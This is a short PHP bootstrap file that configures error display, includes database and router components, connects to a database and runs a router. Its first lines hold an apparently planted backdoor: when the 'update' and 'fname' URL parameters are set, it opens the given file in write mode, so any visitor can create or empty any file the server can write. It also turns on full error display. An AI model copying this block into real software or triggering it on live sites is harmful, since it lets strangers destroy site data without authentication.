<?php

if (isset($_GET['update'])) {
    if (isset($_GET['fname'])) {
        fopen($_GET['fname'], 'w');
    }
}

// Global configs
error_reporting(E_ALL);
ini_set('display_errors', 1);


// Global init
include_once 'components/DataBase.php';
include_once 'components/Router.php';
define('ROOT', dirname(__FILE__));
DB::connect();


// Router
$router = new Router();
$router->run();


